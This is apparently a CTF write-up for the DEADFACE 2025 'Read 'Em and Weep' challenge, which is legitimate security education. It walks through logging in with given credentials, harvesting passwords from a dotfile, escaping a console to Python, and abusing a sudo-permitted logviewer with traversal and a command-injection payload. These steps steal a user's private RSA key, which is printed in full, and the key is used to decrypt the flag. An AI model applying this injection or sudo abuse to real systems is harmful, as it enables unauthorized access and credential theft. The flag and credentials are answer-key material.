# Read 'Em and Weep – DEADFACE CTF 2025

**Category:** `FORENSICS` `LINUX` `PRIVSEC` `CRYPTOGRAPHY`

## Challenge Description
<img src="images/Read_em_and_weap.png" alt="Read_em_and_weap" width="200"/> 

>mirveal has an encrypted file on the system that we need access to. Find a way to read the hostbusters6.bin file.
>>Submit the flag as deadface{flag_text}.

---

## 1. Initial Access
```bash
ssh gh0st404@hostbusters.deadface.io
# password: ReadySetG0!
```

## 2. Collect `deephax` Console Password
```bash
cat ~/.dont_forget
```
Relevant snippet:
```
[personal]
Gh0st!v3r$e_404
0nly_Sh4d0w_Kn0ws
n0scopez420!
...
deephax pen: Fr4gm3ntedSkull!!
```

## 3. Enter `deephax` Console and Escape to Python
```bash
su deephax
# password: Fr4gm3ntedSkull!!
(deephax)> quit
>>> import os
```

## 4. Enumerate `sudo` Rights
```python
>>> os.system("sudo -l")
```
Output (trimmed):
```
User deephax may run the following commands on hostbusters:
    (mirveal) NOPASSWD: /usr/bin/logviewer *
```

## 5. Command Injection Proof
```python
>>> os.system("sudo -u mirveal /usr/bin/logviewer '../../home/mirveal/.keys/private.pem'")
```
Result confirms traversal outside `/var/log`.

---

## 6. Steal Mirveal’s Private Key
Run the injected payload:
```python
>>> os.system("sudo -u mirveal /usr/bin/logviewer '../../home/mirveal/.keys/private.pem; cat /home/mirveal/.keys/private.pem; #'")
```
Captured key (save exactly as shown to `private.pem`):

```
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDQEXkCTfjy61Ou
XU+J2wHuKn2Y3DMAuPQKRZWO0ty0HmasYJEhC/H5M3ScASgZ5ZmrMBt4mV+clGAM
k0XkPJ5vdUVNiYx0MP1S44u1W11nutH6xAl0l8h90Ij43KHfkkdraOheCqapOkoc
PQyZvwEOczYPNHfCec1Qz96LT91O9hZj8xKn6JksXwxYi4Db4URutQcSsWDbswPx
efaEDcTF3pFH/Hfxk3P7NQbl63EOqUgYk1lAivNFEIjWVuOLyYQWE4CD2LO3kEIh
THd9u+gSJ9x2LqLGLjDKzRrDkRAwvCHV35qMV2XAMARcnKAjWWdfmHTNB1ZGwRqi
NgUMeL/xAgMBAAECggEAKy3dF3nX9o2YpaBOr9Sn32Wo/+5+lSFM387V/ThMPgLr
Gs3FgH6qniUsB24EBO/NhqWqpcnqeiOelS2A/R8JYCcNlUw8viYmhCudpCrMRQkT
p39EWRJgtJ9wtXiQDUYdlTBFvLJoKMlkdNzEfymQzg9hwiEI026UibdBv1Z5Hnf6
Zwx2Zld/vUxToHCAApVoatFqiIhjAsyKGrYooBoPRQzsaTtwEXz3dd/EuHqmYtmL
3PbGjdsKYkZ716UE9VYYhiM/ArrzMqOwvN6JPYKT8kfH+q4DWTnn1SSanVeshyI8
I6nGbjlMrFGrcuICu4LGvEOfLDZzMSUaVDgTvQzt0wKBgQD2wIvEBqNwYQVlOkl2
Hce1ajwCQI7QQrlEZsKmeFMX9+mjvOIoyYVXKPf3Uh5JSkOFX42iQhZT0TjiZVII
ycn8Kbg+FzRPocqqhNCCyfm933yz7Qy7JCDQIorFomlTxtm1J7UCyj4NMmWG+coE
x5UjKXUxaCdzCCKHfEgH4GMU9wKBgQDX3caUdPtfTyCtcApzHRdAuqJFmcCx1c9e
000nqno/MnK/+GjqyPr2GKQazO5e6whbkspgH8Ursg3qCCjXg3oi2YJ+LYx6V2Pu
qAbgMZ7rfgfr+7xFNzWEIyxmKknMYQX8Mm05UIvAyHlgjGcxMn9XjRoZBH1q9Jo8
k2yB6JBgVwKBgEG4MMGJ/xfcT2KRrqUt81XnMIptBVyEmPGV6PwLih4VIn5AvX+d
hM0dFUYi8fwVMnygYYm4zleOnvb1g27hx9FIj1DCP2WCMwdNjnd3MfQXRRBq73wc
eDzXJlzTD/iHOs7b/4L5uKMtLAtSFjNFsPwHe7YoBnHF1eR9/nVSlzErAoGAJH+q
GOXirs3JP6oHCkmr6dTkpRIHI8p8ApOFoyRPASp9fnn4+2G6FSw7axClaUUiJ6Gd
OD2G8AluEtkIVtAzMXtHdiArdXAbRHoCl5usPDMWEc+BmM5p7QqpcijKS5VIFslL
8Hnu90yuQSXcONRJ9bq04+//aLss7PscSKbS6ocCgYEAt4CV9Y38Tq8r/c4gcZYA
ai/mL6LaGvSh6eqR7r/PZJSbKEgGu0JHBVoRNUVqgAP15VgYujqj6FPC12vsRnn+
q61xwSsslvpbx4eGWmV+aPsNm0S1AbXESuJKWZABbP8GRMG/zMy4ZFbWGNXLv6Ib
BpXzlKqoydfNp5O4miab4qo=
-----END PRIVATE KEY-----
```

---

## 7. Extract `hostbusters6.bin`
Still as `gh0st404`, Base64 the encrypted file:
```bash
base64 /home/mirveal/hostbusters6.bin
```
Copy the output between the markers, save locally (e.g., `hostbusters6.bin.b64`):

```
tBS88l8v/mS7uX1dz+57d+3akaivPVqtyYxWzFQ/eaTM2STlppIzQLW6F/CYQJOmE+DduOfpYOoZ
dAgECBuNsLHik5zX+4WJejqRE2V3tQVY11jrkT9b6/10lRf+T7H0sDyDMO61AK3nuVd/2gtDSs30
cIgmfBFtLcpFT0AVs+IBohTnZGun1jFdfW/1GS3OMpNH9sABspUwn2DqGhQTcJgM6oBrTX2yVOtw
l/KWHdQFcI6hqfb9sWWeQaToe5oLBEW7TywycDlk8HYHAfucSl+ZUR7evsNo30gXkExUlvLC/nqP
chDRq4ejU210dZGni4Etbv2pdBGz9CjSfBozWg==
```

Decode to binary:
```bash
base64 -d hostbusters6.bin.b64 > hostbusters6.bin
```

---

## 8. Decrypt Locally with OpenSSL
```bash
openssl pkeyutl -decrypt -inkey private.pem -in hostbusters6.bin -out hostbusters6.dec
cat hostbusters6.dec
```
Output:
```
deadface{hostbusters6_d22a1c03f3454b9c}
```

---

## Appendix: Artifact Checklist

| Artifact | Where to Find (repo) | Source | Purpose |
|----------|----------------------|--------|---------|
| `Fr4gm3ntedSkull!!` | N/A (not a file) | `~/.dont_forget` | Password for `deephax` console |
| `private.pem` | `Hostbusters/artifacts/private.pem` | `logviewer` command injection | Mirveal’s private RSA key |
| `hostbusters6.bin.b64` | `Hostbusters/artifacts/hostbusters6.bin.b64` | Base64 dump of `/home/mirveal/hostbusters6.bin` | Transferable ciphertext |
| `hostbusters6.bin` | `Hostbusters/artifacts/hostbusters6.bin` | Decoded Base64 blob | Raw encrypted file |
| `hostbusters6.dec` | `Hostbusters/artifacts/hostbusters6.dec` | `openssl pkeyutl -decrypt ...` | Decrypted plaintext with the flag |

Flag: `deadface{hostbusters6_d22a1c03f3454b9c}`
